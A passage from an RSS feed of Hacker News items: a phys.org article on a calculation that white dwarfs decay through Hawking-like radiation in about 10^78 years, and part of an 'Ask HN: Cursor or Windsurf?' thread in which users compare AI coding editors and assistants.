                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Universe expected to decay in 10⁷⁸ years, much sooner than previously thought (159 pts)]]></title>
            <link>https://phys.org/news/2025-05-universe-decay-years-sooner-previously.html</link>
            <guid>43961226</guid>
            <pubDate>Mon, 12 May 2025 09:46:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://phys.org/news/2025-05-universe-decay-years-sooner-previously.html">https://phys.org/news/2025-05-universe-decay-years-sooner-previously.html</a>, See on <a href="https://news.ycombinator.com/item?id=43961226">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
										
<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2025/universe-decays-faster-1.jpg" data-src="https://scx2.b-cdn.net/gfx/news/hires/2025/universe-decays-faster-1.jpg" data-sub-html="Artistic impression of a neutron star that is 'evaporating' slowly via Hawking-like radiation. Credit: Daniëlle Futselaar/artsource.nl">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2025/universe-decays-faster-1.jpg" alt="Universe decays faster than thought, but still takes a long time" title="Artistic impression of a neutron star that is 'evaporating' slowly via Hawking-like radiation. Credit: Daniëlle Futselaar/artsource.nl" width="800" height="450">
             <figcaption>
                Artistic impression of a neutron star that is 'evaporating' slowly via Hawking-like radiation. Credit: Daniëlle Futselaar/artsource.nl
            </figcaption>        </figure>
    </div><p>The universe is decaying much faster than thought. This is shown by calculations of three Dutch scientists on the so-called Hawking radiation. They calculate that the last stellar remnants take about 10<sup>78</sup> years to perish. That is much shorter than the previously postulated 10<sup>1100</sup> years.</p>


										      
																																	<p>The researchers have published their findings in the <i>Journal of Cosmology and Astroparticle Physics</i>.</p>
<p>The research by black hole expert Heino Falcke, quantum physicist Michael Wondrak, and mathematician Walter van Suijlekom (all from Radboud University, Nijmegen, the Netherlands) is a follow-up to a <a href="https://phys.org/news/2023-06-black-hole-evaporation-theoretical-stephen.html">2023 paper by the same trio</a>.</p>
<p>In that paper, they showed that not only <a href="https://phys.org/tags/black+holes/" rel="tag">black holes</a>, but also other objects such as <a href="https://phys.org/tags/neutron+stars/" rel="tag">neutron stars</a>, can "evaporate" via a process akin to Hawking <a href="https://phys.org/tags/radiation/" rel="tag">radiation</a>. After that publication, the researchers received many questions from inside and outside the scientific community about how long the process would take. They have now answered this question in the new article.</p>
<h2>Ultimate end</h2>
<p>The researchers calculated that the end of the universe is about 10<sup>78</sup> years away, if only Hawking-like radiation is taken into account. This is the time it takes for white dwarf stars, the most persistent celestial bodies, to decay via Hawking-like radiation.</p>
<p>Previous studies, which did not take this effect into account, put the lifetime of white dwarfs at 10<sup>1100</sup> years. Lead author Heino Falcke said, "So the ultimate end of the universe comes much sooner than expected, but fortunately it still takes a very long time."</p>
<p>The researchers did the calculations dead-seriously and with a wink. The basis is a reinterpretation of Hawking radiation. In 1975, physicist Stephen Hawking postulated that contrary to the theory of relativity, particles and radiation could escape from a black hole. At the edge of a black hole, two temporary particles can form, and before they merge, one particle is sucked into the black hole and the other particle escapes.</p>
<p>One of the consequences of this so-called Hawking radiation is that a black hole very slowly decays into particles and radiation. This contradicts Albert Einstein's <a href="https://phys.org/tags/theory+of+relativity/" rel="tag">theory of relativity</a>, which says that black holes can only grow.</p>
<div data-thumb="https://scx1.b-cdn.net/csz/news/tmb/2025/universe-decays-faster.jpg" data-src="https://scx2.b-cdn.net/gfx/news/hires/2025/universe-decays-faster.jpg" data-sub-html="Researchers calculated from ten different objects how long the 'evaporation' via Hawking-like radiation takes in an ideal environment without other influences. White dwarf stars dissolve in about 10<sup>78</sup> years. The human body, if only Hawking-like radiation is involved, decays in 10<sup>90</sup> years. Credit: Falcke, Wondrak &amp; Van Suijlekom">
        <figure>
            <img src="https://scx1.b-cdn.net/csz/news/800a/2025/universe-decays-faster.jpg" alt="Universe decays faster than thought, but still takes a long time" title="Researchers calculated from ten different objects how long the 'evaporation' via Hawking-like radiation takes in an ideal environment without other influences. White dwarf stars dissolve in about 1078 years. The human body, if only Hawking-like radiation is involved, decays in 1090 years. Credit: Falcke, Wondrak &amp; Van Suijlekom">
             <figcaption>
                Researchers calculated from ten different objects how long the 'evaporation' via Hawking-like radiation takes in an ideal environment without other influences. White dwarf stars dissolve in about 10<sup>78</sup> years. The human body, if only Hawking-like radiation is involved, decays in 10<sup>90</sup> years. Credit: Falcke, Wondrak &amp; Van Suijlekom
            </figcaption>        </figure>
    </div>


																																						
																																			<h2>Neutron star as slow as black hole</h2>
<p>The researchers calculated that the process of Hawking radiation theoretically also applies to other objects with a <a href="https://phys.org/tags/gravitational+field/" rel="tag">gravitational field</a>. The calculations further showed that the evaporation time of an object depends only on its density.</p>
<p>To the researchers' surprise, neutron stars and stellar black holes take the same amount of time to decay: 10<sup>67</sup> years. This was unexpected because black holes have a stronger gravitational field, which should cause them to evaporate faster.</p>
<p>"But black holes have no surface," says co-author and postdoctoral researcher Michael Wondrak, "They reabsorb some of their own radiation which inhibits the process."</p>
<h2>Man and moon: 10<sup>90</sup> years</h2>
<p>Because the researchers were at it anyway, they also calculated how long it takes for the moon and a human to evaporate via Hawking-like radiation. That's 10<sup>90</sup> years. Of course, the researchers subtly note, there are other processes that may cause humans and the moon to disappear faster than calculated.</p>
<p>Co-author Walter van Suijlekom, professor of mathematics at Radboud University, adds that the research is an exciting collaboration of different disciplines and that combining astrophysics, <a href="https://phys.org/tags/quantum+physics/" rel="tag">quantum physics</a> and mathematics leads to new insights.</p>
<p>"By asking these kinds of questions and looking at extreme cases, we want to better understand the theory, and perhaps one day, we will unravel the mystery of Hawking radiation."</p>

																																																					
																				<div>
																						<p><strong>More information:</strong>
												H. Falcke et al, An upper limit to the lifetime of stellar remnants from gravitational pair production, <i>Journal of Cosmology and Astroparticle Physics</i>. On <i>arXiv</i> (2024). <a data-doi="1" href="https://dx.doi.org/10.48550/arxiv.2410.14734" target="_blank">DOI: 10.48550/arxiv.2410.14734</a>
																						
																						</p><p>
													<strong>Journal information:</strong>
																											<a href="https://phys.org/journals/arxiv/"><cite>arXiv</cite></a>
														<a href="http://arxiv.org/" target="_blank" rel="nofollow">
															<svg>
																<use href="https://phys.b-cdn.net/tmpl/v6/img/svg/sprite.svg#icon_open" x="0" y="0"></use>
															</svg>
														</a> 
																									</p>
																					</div>
                               											
																					
                              										                                        
										<!-- print only -->
										<div>
											 <p><strong>Citation</strong>:
												Universe expected to decay in 10⁷⁸ years, much sooner than previously thought (2025, May 12)
												retrieved 12 May 2025
												from https://phys.org/news/2025-05-universe-decay-years-sooner-previously.html
											 </p>
											 <p>
											 This document is subject to copyright. Apart from any fair dealing for the purpose of private study or research, no
											 part may be reproduced without the written permission. The content is provided for information purposes only.
											 </p>
										</div>
                                        
									</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Cursor or Windsurf? (256 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=43959710</link>
            <guid>43959710</guid>
            <pubDate>Mon, 12 May 2025 04:41:50 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=43959710">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <tbody><tr id="43960527"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960527" href="https://news.ycombinator.com/vote?id=43960527&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Neither? I'm surprised nobody has said it yet. I turned off AI autocomplete, and sometimes use the chat to debug or generate simple code but only when I prompt it to. Continuous autocomplete is just annoying and slows me down.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43961128"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43961128" href="https://news.ycombinator.com/vote?id=43961128&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Cursor/Windsurf and similar IDEs and plugins are more than autocomplete on steroids.</p><p>Sure, you might not like it and think you as a human should write all code, but frequent experience in the industry in the past months is that productivity in the teams using tools like this has greatly increased.</p><p>It is not unreasonable to think that someone deciding not to use tools like this will not be competitive in the market in the near future.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43961133"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43961133" href="https://news.ycombinator.com/vote?id=43961133&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>We have an internal ban policy on copilot for IP reasons and while I was... missing it initially, now just using neovim without any AI feels fine. Maybe I'll add an avante.nvim for a built-in chat box though.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960839"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960839" href="https://news.ycombinator.com/vote?id=43960839&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>This is the way.</p><p>All this IDE churn makes me glad to have settled on Emacs a decade ago. I have adopted LLMs into my workflow via the excellent gptel, which stays out of my way but is there when I need it. I couldn't imagine switching to another editor because of some fancy LLM integration I have no control over. I have tried Cursor and VS Codium with extensions, and wasn't impressed. I'd rather use an "inferior" editor that's going to continue to work exactly how I want 50 years from now.</p><p>Emacs and Vim are editors for a lifetime. Very few software projects have that longevity and reliability. If a tool is instrumental to the work that you do, those features should be your highest priority. Not whether it works well with the latest tech trends.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43961064"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43961064" href="https://news.ycombinator.com/vote?id=43961064&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Ironically LLMs have made Emacs even more relevant. The model LLMs use (text) happens to match up with how Emacs represents everything (text in buffers). This opens up Emacs to becoming the agentic editor par excellence. Just imagine, some macro magic acound a defcommand and voila, the agent can do exactly what a user can.  If only such a project could have the funding like Cursor does...</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43961109"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_43961109" href="https://news.ycombinator.com/vote?id=43961109&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Nothing could be worse for the modern Emacs ecosystem than for the tech industry finance vampires ("VCs," "LPs") to decide there's blood enough there to suck.</p><p>Fortunately, alien space magic seems immune, so far at least. I assume they do not like the taste, and no wonder.</p></div></td></tr>
        </tbody></table></td></tr>
                        <tr id="43961090"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43961090" href="https://news.ycombinator.com/vote?id=43961090&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I can't even get simple code generation to work for VHDL. It just gives me garbage that does not compile. I have to assume this is not the case for the majority of people using more popular languages? Is this because the training data for VHDL is far more limited? Are these "AIs" not able to consume the VHDL language spec and give me actual legal syntax at least?! Or is this because I'm being cheap and lazy by only trying free chatGPT and I should be using something else?</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960845"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960845" href="https://news.ycombinator.com/vote?id=43960845&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>That is interesting. Which tech are you using?</p><p>Are you getting irrelevant suggestions as those autocompletes are meant to predict the things you are about to type.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960875"><td></td></tr>
                  <tr id="43960844"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960844" href="https://news.ycombinator.com/vote?id=43960844&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I shortcut the "cursor tab" and enable or disable it as needed. If only Ai was smart enough to learn when I do and don't want it (like clippy in the ms days) - when you are manually toggling it on/off clear patterns emerge (to me at least) as to when I do and don't want it.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960870"><td></td></tr>
                <tr id="43960885"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_43960885" href="https://news.ycombinator.com/vote?id=43960885&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Bottom right says "cursor tab" you can manually manipulate it there (and snooze for X minutes - interesting feature). For binding shortcuts - Command/Ctrl + Shift + P, then look for "Enable|Disable|Whatever Cursor Tab" and set shortcuts there.</p><p>Old fashioned variable name / function name auto complete is not affected.</p><p>I considered a small macropad to enable / disable with a status light - but honestly don't do enough work to justify avoiding work by finding / building / configuring / rebuilding such a solution. If the future is this sort of extreme autocomplete in everything I do on a computer, I would probably go to the effort.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43961045"><td><table>  <tbody><tr>    <td indent="4"><img src="https://news.ycombinator.com/s.gif" height="1" width="160"></td><td>
      <center><a id="up_43961045" href="https://news.ycombinator.com/vote?id=43961045&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Thanks!</p><p>The thing that bugs me is when Im trying to use tab to indent with spaces, but I get a suggestion instead.</p><p>I tried to disable caps lock, then remap tab to caps lock, but no joy</p></div></td></tr>
        </tbody></table></td></tr>
                              <tr id="43960859"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960859" href="https://news.ycombinator.com/vote?id=43960859&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>+100. I’ve found the “chat” interface most productive as I can scope a problem appropriately.</p><p>Cursor, Windsurf, etc tend to feel like code vomit that takes more time to sift through than working through code by myself.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960985"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960985" href="https://news.ycombinator.com/vote?id=43960985&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Having it as tab was a mistake, tab complete for snippets is fine because it’s at the end of a line, tab complete in empty text space means you always have to be aware if it’s in autocomplete context or not before setting an indent.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="43960860"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960860" href="https://news.ycombinator.com/vote?id=43960860&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Yeah, I use IntelliJ with the chat sidebar. I don't use autocomplete, except in trivial cases where I need to write boilerplate code. Other than that, when I need help, I ask the LLM and then write the code based on its response.</p><p>I'm sure it's initially slower than vibe-coding the whole thing, but at least I end up with a maintainable code base, and I know how it works and how to extend it in the future.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43961007"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43961007" href="https://news.ycombinator.com/vote?id=43961007&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>AI autocomplete can be infuriating if like me, you like to browse the public methods and properties by dotting the type. The AI autocomplete sometimes kicks in and starts writing broken code using suggestions that don't exist and that prevents quickly exploring the actual methods available.</p><p>I have largely disabled it now, which is a shame, because there are also times it feels like magic and I can see how it could be a massive productivity lever if it needed a tighter confidence threshold to kick in.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43961048"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43961048" href="https://news.ycombinator.com/vote?id=43961048&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>If I can, I map it to ctrl-; so I can bring it up when I need it.</p><p>But I found once it was optional I hardly ever used it.</p><p>I use Deepseek or others as a conversation partner or rubber duck, but I'm perfectly happy writing all my code myself.</p><p>Maybe this approach needs a trendy name to counter the "vibe coding" hype.</p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="43960616"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960616" href="https://news.ycombinator.com/vote?id=43960616&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Agreed. You may like the arms-length stuff here: <a href="https://github.com/day50-dev/llmehelp">https://github.com/day50-dev/llmehelp</a> . shell-hook.zsh and screen-query have been life-changing</p><p>I always forget syntax for things like ssh port forwarding.  Now just describe it at the shell:</p><p>$ ssh (take my local port 80 and forward it to 8080 on the machine betsy) user@betsy</p><p>I press ctrl+x x and it will replace the english with a suggested command. It's been a total game changer for git, jq, rsync, ffmpeg, regex..</p><p>For more involved stuff there's screen-query: Confusing crashes, strange terminal errors, weird config scripts, it allows a joint investigation whereas aider and friends just feels like I'm asking AI to fuck around.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960751"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43960751" href="https://news.ycombinator.com/vote?id=43960751&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>This never accesses any extradata and works only when explicitly asked? I find terminal as most important part from privacy perspective and I haven’t tried any LLM integration yet…</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960818"><td></td></tr>
                        <tr id="43960550"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960550" href="https://news.ycombinator.com/vote?id=43960550&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Yeah</p><p>AI autocomplete is a feature, not a product (to paraphrase SJ)</p><p>I can understand Windsurf getting the valuation as they had their own Codeium model</p><p>$B for a VSCode fork? Lol</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960774"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43960774" href="https://news.ycombinator.com/vote?id=43960774&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Microsoft seems to be always winner - maybe they predicted all this and for this reason they made core extensions closed source.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                        <tr id="43960674"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960674" href="https://news.ycombinator.com/vote?id=43960674&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Asking HN this is like asking which smartphone to use. You'll get suggestions for obscure Linux-based modular phones that weigh 6 kilos and lack a clock app or wifi. But they're better because they're open source or fully configurable or whatever. Or a smartphone that a fellow HNer created in his basement and plans to sell soon.</p><p>Cursor and Windsurf are both good, but do what most people do and use Cursor for a month to start with.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43959899"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43959899" href="https://news.ycombinator.com/vote?id=43959899&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Zed. They've upped their game in the AI integration and so far it's the best one I've seen (external from work). Cursor and VSCode+Copilot always felt slow and janky, Zed is much less janky feels like pretty mature software, and I can just plug in my Gemini API key and use that for free/cheap instead of paying for the editor's own integration.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960546"><td></td></tr>
            <tr id="43960506"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960506" href="https://news.ycombinator.com/vote?id=43960506&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>Consumes lots of resources on an M4 Macbook. Would love to test it though. If it didn’t freeze my Macbook.</p><p>Edit:</p><p>With the latest update to 0.185.15 it works perfectly smooth. Excellent addition to my setup.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960728"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43960728" href="https://news.ycombinator.com/vote?id=43960728&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I'll second the zed recommendation, sent from my M4 macbook. I don't know why exactly it's doing this for you but mine is idling with ~500MB RAM (about as little as you can get with a reasonably-sized Rust codebase and a language server) and 0% CPU.</p><p>I have also really appreciated something that felt much less janky, had better vim bindings, and wasn't slow to start even on a very fast computer. You can completely botch Cursor if you type really fast. On an older mid-range laptop, I ran into problems with a bunch of its auto-pair stuff of all things.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960803"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_43960803" href="https://news.ycombinator.com/vote?id=43960803&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Yeah, same. Zed is <i>incredibly</i> efficient on my M1 Pro. It's my daily driver these days, and my Python setup in it is almost perfect.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                  <tr id="43960874"><td></td></tr>
                  <tr id="43960069"><td></td></tr>
                <tr id="43960155"><td></td></tr>
                <tr id="43960299"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_43960299" href="https://news.ycombinator.com/vote?id=43960299&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>It would be great if there was an easy way to run their open model (<a href="https://huggingface.co/zed-industries/zeta" rel="nofollow">https://huggingface.co/zed-industries/zeta</a>) locally ( for latency reasons ).</p><p>I don't think Zeta is quite up to windsurf's completion quality/speed.</p><p>I get that this would go against their business model, but maybe people would pay for this - it could in theory be the fastest completion since it would run locally.</p></div></td></tr>
        </tbody></table></td></tr>
                              <tr id="43960136"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960136" href="https://news.ycombinator.com/vote?id=43960136&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>For the agentic stuff I think every solution can be hit or miss. I've tried claude code, aider, cline, cursor, zed, roo, windsurf, etc. To me it is more about using the right models for the job, which is also constantly in flux because the big players are constantly updating their models and sometimes that is good and sometimes that is bad.</p><p>But I daily drive Cursor because the main LLM feature I use is tab-complete, and here Cursor blows the competition out of the water. It understands what I want to do next about 95% of the time when I'm in the middle of something, including comprehensive multi-line/multi-file changes. Github Copilot, Zed, Windsurf, and Cody aren't at the same level imo.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960573"><td></td></tr>
                <tr id="43960635"><td></td></tr>
                        <tr id="43960296"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43960296" href="https://news.ycombinator.com/vote?id=43960296&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>For a time windsurf was way ahead of cursor in full agentic coding, but now I hear cursor has caught up. I have yet to switch back to try out cursor again but starting to get frustrated with Windsurf being restricted to gathering context only 100-200 lines at a time.</p><p>So many of the bugs and poor results that it can introduce are simply due to improper context. When forcibly giving it the necessary context you can clearly see it’s not a model problem but it’s a problem with the approach of gathering disparate 100 line snippets at a time.</p><p>Also, it struggles with files over 800ish lines which is extremely annoying</p><p>We need some smart deepseek-like innovation in context gathering since the hardware and cost of tokens is the real bottleneck here.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43959984"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43959984" href="https://news.ycombinator.com/vote?id=43959984&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Aider! Use the editor of your choice and leave your coding assistant separate. Plus, it's open source and will stay like this, so no risk to see it suddenly become expensive or dissappear.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960453"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960453" href="https://news.ycombinator.com/vote?id=43960453&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>Approximately how much does it cost in practice to use Aider? My understanding is that Aider itself is free, but you have to pay per token when using an API key for your LLM of choice. I can look up for myself the prices of the various LLMs, but it doesn't help much, since I have no intuition whatsoever about how many tokens I am likely to consume. The attraction of something like Zed or Cursor for me is that I just have a fixed monthly cost to worry about. I'd love to try Aider, as I suspect it suits my style of work better, but without having any idea how much it would cost me, I'm afraid of trying.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960743"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43960743" href="https://news.ycombinator.com/vote?id=43960743&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I'm using Gemini 2.5 Pro with Aider and Cline for work. I'd say when working for 8 full hours without any meetings or other interruptions, I'd hit around $2. In practice, I average at $0.50 and hit $1 once in the last weeks.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960920"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_43960920" href="https://news.ycombinator.com/vote?id=43960920&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>This is very inexpensive. What is your workflow and savings techniques! I can spend $10/h or more with very short sessions and few files.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                  <tr id="43960548"><td></td></tr>
                <tr id="43960703"><td></td></tr>
                <tr id="43960980"><td><table>  <tbody><tr>    <td indent="4"><img src="https://news.ycombinator.com/s.gif" height="1" width="160"></td><td>
      <center><a id="up_43960980" href="https://news.ycombinator.com/vote?id=43960980&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>To be honest I'm using windsurf with openAI/google right now and used deepseek with aider when it was still less crowded.</p><p>My only problem was deepseek occasionally not answering at all, but generally it was fast (non thinking that was).</p></div></td></tr>
        </tbody></table></td></tr>
                              <tr id="43960110"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43960110" href="https://news.ycombinator.com/vote?id=43960110&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I used to be religiously pro-Aider. But after a while those little frictions flicking backwards and forwards between the terminal and VS Code, and adding and dropping from the context myself, have worn down my appetite to use it. The `--watch` mode is a neat solution but harms performance. The LLM gets distracted by deleting its own comment.</p><p>Roo is less solid but better-integrated.</p><p>Hopefully I'll switch back soon.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960199"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_43960199" href="https://news.ycombinator.com/vote?id=43960199&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div>
                  <p>I suspect that if you're a vim user those friction points are a bit different. For me, Aider's git auto commit and /undo command are what sells it for me at this current junction of technology. OpenHands looks promising, though rather complex.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960384"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_43960384" href="https://news.ycombinator.com/vote?id=43960384&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>The (relative) simplicity is what sells aider for me (it also helps that I use neovim in tmux).</p><p>It was easy to figure out exactly what it's sending to the LLM, and I like that it does one thing at a time. I want to babysit my LLMs and those "agentic" tools that go off and do dozens of things in a loop make me feel out of control.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43960675"><td><table>  <tbody><tr>    <td indent="4"><img src="https://news.ycombinator.com/s.gif" height="1" width="160"></td><td>
      <center><a id="up_43960675" href="https://news.ycombinator.com/vote?id=43960675&amp;how=up&amp;goto=item%3Fid%3D43959710"></a></center>    </td><td><br><div><p>I like your framing about “feeling out of control”.</p><p>For the occasional frontend task, I don’t mind being out of control when using agentic tools. I guess this is the origin of Karpathy’s vibe coding moniker: you surrender to the LLM’s coding decisions.</p><p>For backend tasks, which is my bread and butter, I certainly want to know what it’s sending to the LLM so it’s just easier to use the chat interface directly.</p><p>This way I am fully in control. I can cherry pick the good bits out of whatever the LLM suggests or redo my prompt to get better suggestions.</p></div></td></tr>
        </tbody></table></td></tr>
                              <tr id="43960122"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
